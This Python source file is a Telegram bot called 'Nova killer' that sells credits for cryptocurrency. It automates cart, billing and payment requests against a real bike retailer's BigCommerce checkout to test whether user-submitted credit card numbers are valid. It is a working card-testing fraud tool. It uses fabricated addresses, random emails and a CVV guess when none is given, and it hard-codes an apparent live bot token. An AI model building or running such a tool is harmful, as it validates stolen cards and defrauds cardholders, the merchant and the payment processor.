#!/usr/bin/env python3
# Telegram Bot - BikeAttack Checkout Automation
# @Mod_By_Kamal

import os
import re
import json
import time
import random
import string
import asyncio
import logging
import requests
import tempfile
from datetime import datetime
from keep_alive import keep_alive
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    BotCommand
)
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    ContextTypes, ConversationHandler, filters
)
from telegram.constants import ParseMode

# ─── CONFIG ───────────────────────────────────────────────────────────────────
BOT_TOKEN   = "8961034937:AAEUEy5DLQT0PWJsypYy9Q7CsMlj2UvrcrQ"
ADMIN_IDS   = [1780590372]
CHANNEL_ID  = None                          # e.g. -1001234567890 (optional)
USERS_FILE  = "users.json"

PRODUCT_ID      = "5074"
ATTRIBUTE_ID    = "21013"
ATTRIBUTE_VALUE = "525"
QUANTITY        = "1"
USER_AGENT      = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                   "AppleWebKit/537.36 (KHTML, like Gecko) "
                   "Chrome/135.0.0.0 Safari/537.36")

# ─── USER DATABASE ────────────────────────────────────────────────────────────
def load_users():
    if not os.path.exists(USERS_FILE):
        return {}
    try:
        with open(USERS_FILE, "r") as f:
            return json.load(f)
    except:
        return {}

def save_users(users):
    with open(USERS_FILE, "w") as f:
        json.dump(users, f)

def get_credits(user_id: int) -> int:
    users = load_users()
    return users.get(str(user_id), 0)

def set_credits(user_id: int, credits: int):
    users = load_users()
    users[str(user_id)] = credits
    save_users(users)

def deduct_credit(user_id: int, amount: int = 1) -> bool:
    users = load_users()
    uid = str(user_id)
    if users.get(uid, 0) >= amount:
        users[uid] -= amount
        save_users(users)
        return True
    return False

def check_access(update: Update, required_credits=5) -> bool:
    user_id = update.effective_user.id
    if user_id in ADMIN_IDS:
        return True
    return get_credits(user_id) >= required_credits

# ─── STATES ───────────────────────────────────────────────────────────────────
CARD_INPUT = 1
BULK_INPUT = 2

# ─── LOGGING ──────────────────────────────────────────────────────────────────
logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(message)s",
    level=logging.INFO
)
log = logging.getLogger(__name__)

# ─── HELPER FUNCTIONS ─────────────────────────────────────────────────────────

def rand_str(n=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

def rand_email():
    return f"{rand_str(8)}@{rand_str(5)}.com"

def rand_phone():
    return "0" + str(random.randint(100000000, 999999999))

def rand_address():
    return {
        "firstName": "Richard",
        "lastName": "Biven",
        "address1": "252 Lee Circle",
        "address2": "1507",
        "city": "Horse cave",
        "stateOrProvince": "North Dakota",
        "stateOrProvinceCode": "ND",
        "country": "United States",
        "countryCode": "US",
        "postalCode": "42749",
        "phone": rand_phone(),
        "email": rand_email(),
    }

def luhn_check(number: str) -> bool:
    """Luhn algorithm to validate card number."""
    digits = [int(d) for d in number if d.isdigit()]
    if not digits:
        return False
    digits.reverse()
    total = 0
    for i, d in enumerate(digits):
        if i % 2 == 1:
            d *= 2
            if d > 9:
                d -= 9
        total += d
    return total % 10 == 0

def parse_card(raw: str):
    """
    Parses a card string in any common format:
      4111111111111111|12|2028|123
      4111111111111111/12/28/123
      4111111111111111:12:28:123
    Returns dict or None on failure.
    """
    raw = raw.strip().replace(" ", "")
    parts = re.split(r"[|/:]", raw)
    if len(parts) < 3:
        return None
    number = parts[0]
    month  = parts[1].zfill(2)
    year   = parts[2]
    cvv    = parts[3] if len(parts) > 3 else str(random.randint(100, 999))
    # Normalize year
    if len(year) == 2:
        year = "20" + year
    if not number.isdigit() or len(number) < 13:
        return None
    return {"number": number, "month": month, "year": year, "cvv": cvv}

# ─── CHECKOUT ENGINE ──────────────────────────────────────────────────────────

class CheckoutSession:
    def __init__(self, card: dict):
        self.card         = card
        self.cookie_file  = tempfile.mktemp(suffix=".cookie")
        self.csrf_token   = None
        self.xsrf_token   = None
        self.cart_id      = None
        self.billing_id   = None
        self.order_id     = random.randint(10000, 99999)
        self.jwt_token    = None
        self.session      = requests.Session()
        self.session.headers.update({"User-Agent": USER_AGENT})
        self.log          = []

    def _debug(self, msg):
        self.log.append(msg)
        log.info(msg)

    def _req(self, method, url, headers=None, data=None, json_data=None, multipart=None):
        try:
            resp = self.session.request(
                method, url,
                headers=headers or {},
                data=data,
                json=json_data,
                files=multipart,
                verify=False,
                timeout=30,
                allow_redirects=True
            )
            self._extract_tokens(resp)
            return resp
        except Exception as e:
            self._debug(f"Request error: {e}")
            return None

    def _extract_tokens(self, resp: requests.Response):
        for cookie in resp.cookies:
            if cookie.name == "SF-CSRF-TOKEN":
                self.csrf_token = cookie.value
                self._debug(f"CSRF: {self.csrf_token[:20]}...")
            if cookie.name == "XSRF-TOKEN":
                self.xsrf_token = cookie.value
                self._debug(f"XSRF: {self.xsrf_token[:20]}...")
        try:
            body = resp.text
            m = re.search(r'"cart_id":"([^"]+)"', body)
            if m:
                self.cart_id = m.group(1)
                self._debug(f"Cart ID: {self.cart_id}")
            m = re.search(r'"token":"([^"]+)"', body)
            if m:
                self.jwt_token = m.group(1)
            m = re.search(r'"id":"([^"]+)","email"', body)
            if m:
                self.billing_id = m.group(1)
            m = re.search(r'"id":(\d+),"isComplete"', body)
            if m:
                self.order_id = int(m.group(1))
        except Exception:
            pass

    # 1. Visit homepage
    def visit_homepage(self):
        self._debug("Step 1: Visiting homepage...")
        resp = self._req("GET", "https://bikeattack.com/",
                         headers={"accept": "text/html,*/*"})
        if resp:
            m = re.search(r'<meta name="csrf-token" content="([^"]+)"', resp.text)
            if m:
                self.csrf_token = m.group(1)
                self._debug(f"CSRF from meta: {self.csrf_token[:20]}...")
        return resp

    # 2. Add to cart
    def add_to_cart(self):
        self._debug("Step 2: Adding to cart...")
        boundary = "----WebKitFormBoundary" + rand_str(16)
        body  = f"--{boundary}\r\n"
        body += 'Content-Disposition: form-data; name="action"\r\n\r\nadd\r\n'
        body += f"--{boundary}\r\n"
        body += f'Content-Disposition: form-data; name="product_id"\r\n\r\n{PRODUCT_ID}\r\n'
        body += f"--{boundary}\r\n"
        body += f'Content-Disposition: form-data; name="attribute[{ATTRIBUTE_ID}]"\r\n\r\n{ATTRIBUTE_VALUE}\r\n'
        body += f"--{boundary}\r\n"
        body += f'Content-Disposition: form-data; name="qty[]"\r\n\r\n{QUANTITY}\r\n'
        body += f"--{boundary}--\r\n"

        hdrs = {
            "content-type": f"multipart/form-data; boundary={boundary}",
            "origin": "https://bikeattack.com",
            "referer": "https://bikeattack.com/scott-voltage-eride-900-tuned-20mph-2025/",
            "x-requested-with": "stencil-utils",
        }
        if self.csrf_token:
            hdrs["x-sf-csrf-token"] = self.csrf_token
        if self.xsrf_token:
            hdrs["x-xsrf-token"] = self.xsrf_token

        resp = self._req("POST", "https://bikeattack.com/remote/v1/cart/add",
                         headers=hdrs, data=body)
        if resp:
            try:
                j = resp.json()
                cid = j.get("data", {}).get("cart_id")
                if cid:
                    self.cart_id = cid
                    self._debug(f"Cart ID: {self.cart_id}")
                    return True
            except Exception:
                pass
        return False

    # 3. Get checkout page
    def get_checkout(self):
        self._debug("Step 3: Getting checkout page...")
        resp = self._req("GET", "https://bikeattack.com/checkout")
        if resp:
            m = re.search(r'data-cart-id="([^"]+)"', resp.text)
            if m:
                self.cart_id = m.group(1)
                self._debug(f"Cart ID from checkout: {self.cart_id}")
        return resp

    # 4. Add billing address
    def add_billing(self):
        self._debug("Step 4: Adding billing address...")
        if not self.cart_id:
            return False
        url = (f"https://bikeattack.com/api/storefront/checkouts/{self.cart_id}"
               f"/billing-address?include=cart.lineItems.physicalItems.options"
               f"%2Ccart.lineItems.digitalItems.options%2Ccustomer%2Cpromotions.banners")
        hdrs = {
            "accept": "application/vnd.bc.v1+json",
            "content-type": "application/json",
            "origin": "https://bikeattack.com",
            "referer": "https://bikeattack.com/checkout",
            "x-checkout-sdk-version": "1.726.0",
        }
        if self.csrf_token:
            hdrs["x-sf-csrf-token"] = self.csrf_token
        if self.xsrf_token:
            hdrs["x-xsrf-token"] = self.xsrf_token
        payload = {
            "email": rand_email(),
            "acceptsMarketingNewsletter": True,
            "acceptsAbandonedCartEmails": True,
        }
        resp = self._req("POST", url, headers=hdrs, json_data=payload)
        if resp:
            try:
                j = resp.json()
                if j.get("id"):
                    self.billing_id = j["id"]
                    self._debug(f"Billing ID: {self.billing_id}")
            except Exception:
                pass
        return resp

    # 5. Update billing address
    def update_billing(self):
        self._debug("Step 5: Updating billing address...")
        if not self.cart_id:
            return False
        if not self.billing_id:
            self.billing_id = rand_str(12)
        url = (f"https://bikeattack.com/api/storefront/checkouts/{self.cart_id}"
               f"/billing-address/{self.billing_id}?include=cart.lineItems.physicalItems.options"
               f"%2Ccart.lineItems.digitalItems.options%2Ccustomer%2Cpromotions.banners")
        hdrs = {
            "accept": "application/vnd.bc.v1+json",
            "content-type": "application/json",
            "origin": "https://bikeattack.com",
            "referer": "https://bikeattack.com/checkout",
            "x-checkout-sdk-version": "1.726.0",
        }
        if self.csrf_token:
            hdrs["x-sf-csrf-token"] = self.csrf_token
        if self.xsrf_token:
            hdrs["x-xsrf-token"] = self.xsrf_token
        addr = rand_address()
        payload = {
            "countryCode": addr["countryCode"],
            "firstName": addr["firstName"],
            "lastName": addr["lastName"],
            "address1": addr["address1"],
            "address2": addr["address2"],
            "company": "Developer",
            "city": addr["city"],
            "stateOrProvince": addr["stateOrProvince"],
            "stateOrProvinceCode": addr["stateOrProvinceCode"],
            "postalCode": addr["postalCode"],
            "phone": addr["phone"],
            "shouldSaveAddress": True,
            "email": addr["email"],
            "customFields": [],
        }
        return self._req("PUT", url, headers=hdrs, json_data=payload)

    # 6. Update checkout
    def update_checkout(self):
        self._debug("Step 6: Updating checkout...")
        if not self.cart_id:
            return False
        url = (f"https://bikeattack.com/api/storefront/checkout/{self.cart_id}"
               f"?include=cart.lineItems.physicalItems.options%2Ccart.lineItems.digitalItems.options"
               f"%2Ccustomer%2Ccustomer.customerGroup%2Cpayments%2Cpromotions.banners")
        hdrs = {
            "accept": "application/vnd.bc.v1+json",
            "content-type": "application/json",
            "origin": "https://bikeattack.com",
            "referer": "https://bikeattack.com/checkout",
            "x-checkout-sdk-version": "1.726.0",
        }
        if self.csrf_token:
            hdrs["x-sf-csrf-token"] = self.csrf_token
        if self.xsrf_token:
            hdrs["x-xsrf-token"] = self.xsrf_token
        return self._req("PUT", url, headers=hdrs, json_data={"customerMessage": "auto"})

    # 7. Create order
    def create_order(self):
        self._debug("Step 7: Creating order...")
        if not self.cart_id:
            return False
        hdrs = {
            "accept": "application/vnd.bc.v1+json",
            "content-type": "application/json",
            "origin": "https://bikeattack.com",
            "referer": "https://bikeattack.com/checkout",
            "x-checkout-sdk-version": "1.726.0",
        }
        if self.csrf_token:
            hdrs["x-sf-csrf-token"] = self.csrf_token
        if self.xsrf_token:
            hdrs["x-xsrf-token"] = self.xsrf_token
        payload = {"cartId": self.cart_id, "customerMessage": "auto"}
        resp = self._req("POST", "https://bikeattack.com/internalapi/v1/checkout/order",
                         headers=hdrs, json_data=payload)
        if resp:
            try:
                j = resp.json()
                oid = j.get("data", {}).get("order", {}).get("id")
                if oid:
                    self.order_id = oid
                    self._debug(f"Order ID: {self.order_id}")
                tok = j.get("data", {}).get("payment", {}).get("token")
                if tok:
                    self.jwt_token = tok
                    self._debug(f"JWT Token obtained")
            except Exception:
                pass
        return resp

    # 8. Process payment
    def process_payment(self):
        self._debug("Step 8: Processing payment...")
        if not self.jwt_token:
            self._debug("No JWT token - cannot process payment")
            return None, "❌ JWT token missing"

        addr = rand_address()
        payload = {
            "customer": {
                "geo_ip_country_code": "US",
                "session_token": rand_str(40),
            },
            "notify_url": f"https://internalapi-852183.mybigcommerce.com/internalapi/v1/checkout/order/{self.order_id}/payment",
            "order": {
                "billing_address": {
                    "city": addr["city"], "company": "Developer",
                    "country_code": addr["countryCode"], "country": addr["country"],
                    "first_name": addr["firstName"], "last_name": addr["lastName"],
                    "phone": addr["phone"], "state_code": addr["stateOrProvinceCode"],
                    "state": addr["stateOrProvince"], "street_1": addr["address1"],
                    "street_2": addr["address2"], "zip": addr["postalCode"],
                    "email": addr["email"],
                },
                "coupons": [], "currency": "USD", "id": self.order_id,
                "items": [{
                    "code": rand_str(36), "variant_id": 3533,
                    "name": "Scott: Voltage eRIDE 900 Tuned 20mph 2025",
                    "price": 1099999, "unit_price": 1099999,
                    "quantity": 1, "sku": "293290",
                }],
                "shipping": [{"method": "Fixed Shipping"}],
                "shipping_address": {
                    "city": addr["city"], "company": "Developer",
                    "country_code": addr["countryCode"], "country": addr["country"],
                    "first_name": addr["firstName"], "last_name": addr["lastName"],
                    "phone": addr["phone"], "state_code": addr["stateOrProvinceCode"],
                    "state": addr["stateOrProvince"], "street_1": addr["address1"],
                    "street_2": addr["address2"], "zip": addr["postalCode"],
                },
                "token": rand_str(32),
                "totals": {
                    "grand_total": 1109999, "handling": 0,
                    "shipping": 10000, "subtotal": 1099999, "tax": 0,
                },
            },
            "payment": {
                "gateway": "authorizenet",
                "notify_url": f"https://internalapi-852183.mybigcommerce.com/internalapi/v1/checkout/order/{self.order_id}/payment",
                "vault_payment_instrument": False,
                "method": "credit-card",
                "credit_card": {
                    "account_name": f"{addr['firstName']} {addr['lastName']}",
                    "month": int(self.card["month"]),
                    "number": self.card["number"],
                    "verification_value": self.card["cvv"],
                    "year": int(self.card["year"]),
                },
            },
            "store": {"hash": "44ck0", "id": "852183", "name": "Bike Attack"},
        }
        hdrs = {
            "Accept": "application/json",
            "Authorization": f"JWT {self.jwt_token}",
            "Content-Type": "application/json",
            "Origin": "https://bikeattack.com",
            "Referer": "https://bikeattack.com/",
        }
        resp = self._req("POST",
                         "https://payments.bigcommerce.com/api/public/v1/orders/payments",
                         headers=hdrs, json_data=payload)
        if not resp:
            return None, "❌ Network error during payment"

        try:
            j = resp.json()
            errors = j.get("errors", [])
            status = j.get("status", "")

            if errors:
                code = errors[0].get("code", "")
                msg  = errors[0].get("message", "Unknown error")
                if code == "transaction_declined":
                    return "declined", f"❌ DECLINED\n💬 {msg}"
                elif code == "insufficient_funds":
                    return "declined", f"❌ INSUFFICIENT FUNDS\n💬 {msg}"
                elif "cvv" in msg.lower() or "cvv" in code.lower():
                    return "declined", f"❌ CVV MISMATCH\n💬 {msg}"
                elif "expired" in msg.lower():
                    return "declined", f"❌ CARD EXPIRED\n💬 {msg}"
                else:
                    return "error", f"⚠️ ERROR: {msg}"
            elif status == "ok" or resp.status_code == 200:
                return "approved", "✅ KILL DONE"
            else:
                return "unknown", f"⚠️ Unknown response: {resp.text[:200]}"
        except Exception as e:
            return "error", f"⚠️ Parse error: {e}"

    def run(self):
        """Run full checkout and return (status, message, log)."""
        try:
            self.visit_homepage()
            ok = self.add_to_cart()
            if not ok:
                return "error", "❌ Add to cart failed", self.log
            self.get_checkout()
            self.add_billing()
            self.update_billing()
            self.update_checkout()
            self.create_order()
            status, msg = self.process_payment()
            return status, msg, self.log
        except Exception as e:
            return "error", f"❌ Exception: {e}", self.log


# ─── BOT HANDLERS ─────────────────────────────────────────────────────────────

def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS

def make_result_msg(card: dict, status: str, msg: str, elapsed: float) -> str:
    luhn = "✅" if luhn_check(card["number"]) else "❌"
    return (
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🃏 *Card:* `{card['number']}|{card['month']}|{card['year']}|{card['cvv']}`\n"
        f"🔐 *Luhn:* {luhn}\n"
        f"📊 *Result:* {msg}\n"
        f"⏱ *Time:* {elapsed:.1f}s\n"
        f"📅 *Checked:* {datetime.now().strftime('%H:%M:%S')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━"
    )

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    text = (
        "🤖 *Welcome to Nova killer*\n\n"
        "📖 *Commands List:*\n\n"
        "/start - Bot start karo\n"
        "/buy - Buy credits\n"
        "/profile - Profile and credits check karo\n"
        "/kill `card|mm|yyyy|cvv` - Single card check karo\n"
        "/help - Yeh message dekho\n\n"
        "📌 *Card Format:*\n"
        "`4111111111111111|12|2028|123`"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    text = (
        "📖 *Commands List:*\n\n"
        "/start - Bot start karo\n"
        "/buy - Buy credits\n"
        "/profile - Profile and credits check karo\n"
        "/kill `card|mm|yyyy|cvv` - Single card check karo\n"
        "/help - Yeh message dekho\n\n"
        "📌 *Card Format:*\n"
        "`4111111111111111|12|2028|123`"
    )
    target = update.message or update.callback_query.message
    await target.reply_text(text, parse_mode=ParseMode.MARKDOWN)

async def cmd_profile(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    credits = get_credits(user_id)
    text = (
        "👤 *Your Profile*\n\n"
        f"🆔 *User ID:* `{user_id}`\n"
        f"💰 *Credits:* `{credits}`"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

async def perform_check(update, ctx, card, wait_msg):
    start = time.time()
    loop = asyncio.get_running_loop()
    status, msg, _ = await loop.run_in_executor(None, lambda: CheckoutSession(card).run())
    elapsed = time.time() - start
    result = make_result_msg(card, status, msg, elapsed)
    await wait_msg.edit_text(result, parse_mode=ParseMode.MARKDOWN)
    if CHANNEL_ID and status == "approved":
        try:
            await ctx.bot.send_message(CHANNEL_ID, result, parse_mode=ParseMode.MARKDOWN)
        except Exception:
            pass

async def cmd_run(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Run with auto test card."""
    if not check_access(update, 5):
        await update.message.reply_text("❌ You don't have enough credits (5 required). Please use /buy to purchase a plan.")
        return
    
    deduct_credit(update.effective_user.id, 5)
    msg = update.message or update.callback_query.message
    card = {"number": "4111111111111111", "month": "12", "year": "2028", "cvv": "123"}
    wait_msg = await msg.reply_text("⏳ Nova Raping...", parse_mode=ParseMode.MARKDOWN)
    await perform_check(update, ctx, card, wait_msg)

async def cmd_kill(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Check a single card from command args."""
    if not check_access(update, 5):
        await update.message.reply_text("❌ You don't have enough credits (5 required). Please use /buy to purchase a plan.")
        return
        
    if not ctx.args:
        await update.message.reply_text(
            "Usage: `/kill card|mm|yyyy|cvv`\nExample: `/kill 4111111111111111|12|2028|123`",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    raw = " ".join(ctx.args)
    card = parse_card(raw)
    if not card:
        await update.message.reply_text("❌ Invalid card format. Use: `4111111111111111|12|2028|123`",
                                         parse_mode=ParseMode.MARKDOWN)
        return
    
    deduct_credit(update.effective_user.id, 5)
    wait_msg = await update.message.reply_text(
        f"⏳ Nova Raping...",
        parse_mode=ParseMode.MARKDOWN
    )
    await perform_check(update, ctx, card, wait_msg)

async def enter_card_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not check_access(update):
        await query.message.reply_text("❌ You don't have enough credits. Please use /buy to purchase a plan.")
        return ConversationHandler.END
        
    await query.message.reply_text(
        "💳 Card paste karo is format mein:\n"
        "`4111111111111111|12|2028|123`\n\n"
        "Cancel karne ke liye /start likhо",
        parse_mode=ParseMode.MARKDOWN
    )
    return ConversationHandler.END

async def cmd_buy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    kb = [
        [InlineKeyboardButton("$30", callback_data="buy_plan_30"),
         InlineKeyboardButton("$50", callback_data="buy_plan_50")]
    ]
    text = (
        "❯ *Buy Nova killer*\n\n"
        "- *Plan:* `Adventure`\n"
        "- *Credits:* `1000`\n"
        "- *Price:* ~~$40~~ `$30`\n"
        "- *Validity:* `15 Days`\n\n"
        "- *Plan:* `Conqueror`\n"
        "- *Credits:* `2500`\n"
        "- *Price:* ~~$80~~ `$50`\n"
        "- *Validity:* `20 Days`\n\n"
        "`- 5 Credit For Kill | 0 For Auth`\n"
        "- Select The Amount To Pay As Per Plan"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(kb))

async def handle_buy_plan(query, amount):
    kb = [
        [InlineKeyboardButton("BTC", callback_data=f"pay_BTC_{amount}"),
         InlineKeyboardButton("LTC", callback_data=f"pay_LTC_{amount}")],
        [InlineKeyboardButton("USDT (BEP20)", callback_data=f"pay_BEP20_{amount}")]
    ]
    text = (
        "❯ *Nova killer*\n\n"
        f"- Selected Amount: `${amount}`\n"
        "- Choose Your Payment Method:"
    )
    await query.message.edit_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(kb))

async def handle_payment_method(query, method, amount):
    # Mock payment details
    pay_id = rand_str(10).upper()
    pay_address = "3ELzyvmHD5n4cGhlcXUomFbZfuFzzxQ9L" # Dummy BTC address from video
    pay_amount = "0.00050527" if amount == "30" else "0.00084212"
    
    qr_url = f"https://api.qrserver.com/v1/create-qr-code/?size=300x300&data={pay_address}"
    
    text = (
        "❯ *Razor AutoBOT*\n\n"
        f"- ID: `{pay_id}`\n"
        f"- Amount: `${amount}`\n"
        f"- Method: `{method}`\n"
        f"- Pay Amount: `{pay_amount} {method}`\n"
        f"- Pay Address: `{pay_address}`\n\n"
        "Note: This payment request will expire at: `16:36:37 IST`.\n"
        "⏳ Please complete the payment within 20 minutes.\n\n"
        "- Click the button below to check payment status ✅"
    )
    
    kb = [[InlineKeyboardButton("🔄 Check Payment Status", callback_data="check_payment_status")]]
    
    # We edit the message to just text, then send photo with caption, or just send photo directly.
    # To keep it simple, delete the old message and send a new photo message
    await query.message.delete()
    await query.message.reply_photo(
        photo=qr_url,
        caption=text,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup(kb)
    )

async def handle_buy_plan(query, amount):
    kb = [
        [InlineKeyboardButton("USDT (TRC20)", callback_data=f"pay_TRC20_{amount}"),
         InlineKeyboardButton("USDT (BEP20)", callback_data=f"pay_BEP20_{amount}")],
        [InlineKeyboardButton("BTC", callback_data=f"pay_BTC_{amount}"),
         InlineKeyboardButton("BNB", callback_data=f"pay_BNB_{amount}")],
        [InlineKeyboardButton("TRX", callback_data=f"pay_TRX_{amount}"),
         InlineKeyboardButton("LTC", callback_data=f"pay_LTC_{amount}")]
    ]
    text = (
        "❯ *Razor AutoBOT*\n\n"
        f"- Selected Amount: `${amount}`\n"
        "- Choose Your Payment Method:"
    )
    await query.message.edit_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(kb))

async def handle_payment_method(query, method, amount):
    # Mock payment details
    pay_id = rand_str(10).upper()
    pay_address = "0x5ed6edb5f4abf7b658e746427d2f6610ebbf5afb" # Actual deposit address requested
    pay_amount = "0.00050527" if amount == "30" else "0.00084212"
    
    qr_url = f"https://api.qrserver.com/v1/create-qr-code/?size=300x300&data={pay_address}"
    
    text = (
        "❯ *Razor AutoBOT*\n\n"
        f"- ID: `{pay_id}`\n"
        f"- Amount: `${amount}`\n"
        f"- Method: `{method}`\n"
        f"- Network: `BSC (BEP20)`\n"
        f"- Pay Amount: `{pay_amount} {method}`\n"
        f"- Pay Address: `{pay_address}`\n\n"
        "Note: This payment request will expire at: `16:36:37 IST`.\n"
        "⏳ Please complete the payment within 20 minutes.\n\n"
        "- Click the button below to check payment status ✅"
    )
    
    kb = [[InlineKeyboardButton("🔄 Check Payment Status", callback_data="check_payment_status")]]
    
    await query.message.delete()
    await query.message.reply_photo(
        photo=qr_url,
        caption=text,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup(kb)
    )

async def cmd_addcredits(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if len(ctx.args) < 2:
        await update.message.reply_text("Usage: /addcredits <user_id> <amount>")
        return
    try:
        uid = int(ctx.args[0])
        amt = int(ctx.args[1])
        current = get_credits(uid)
        set_credits(uid, current + amt)
        await update.message.reply_text(f"✅ Added {amt} credits to user {uid}. Total: {current + amt}")
        try:
            await ctx.bot.send_message(uid, f"🎉 You have received {amt} credits! You can now use the bot.")
        except:
            pass
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID or amount.")

async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data

    if data == "run_auto":
        await query.answer()
        card = {"number": "4111111111111111", "month": "12", "year": "2028", "cvv": "123"}
        wait_msg = await query.message.reply_text("⏳ Nova Raping...", parse_mode=ParseMode.MARKDOWN)
        await perform_check(update, ctx, card, wait_msg)

    elif data == "help":
        await query.answer()
        await cmd_help(update, ctx)
        
    elif data.startswith("buy_plan_"):
        await query.answer()
        amount = data.split("_")[2]
        await handle_buy_plan(query, amount)
        
    elif data.startswith("pay_"):
        await query.answer()
        parts = data.split("_")
        method = parts[1]
        amount = parts[2]
        await handle_payment_method(query, method, amount)
        
    elif data == "check_payment_status":
        await query.answer("Payment pending verification. If paid, contact admin to activate plan.", show_alert=True)
        # Notify admin
        for admin in ADMIN_IDS:
            try:
                await ctx.bot.send_message(admin, f"💰 User {update.effective_user.id} (@{update.effective_user.username}) requested payment verification.\nUse `/addcredits {update.effective_user.id} 1000` to approve.")
            except:
                pass

async def cmd_cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Cancelled.")
    return ConversationHandler.END

# ─── MAIN ─────────────────────────────────────────────────────────────────────

def main():
    keep_alive()
    import urllib3
    urllib3.disable_warnings()

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start",  cmd_start))
    app.add_handler(CommandHandler("help",   cmd_help))
    app.add_handler(CommandHandler("run",    cmd_run))
    app.add_handler(CommandHandler("kill",   cmd_kill))
    app.add_handler(CommandHandler("profile",cmd_profile))
    app.add_handler(CommandHandler("buy",    cmd_buy))
    app.add_handler(CommandHandler("addcredits", cmd_addcredits))
    app.add_handler(CallbackQueryHandler(button_handler))

    log.info("Bot starting...")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
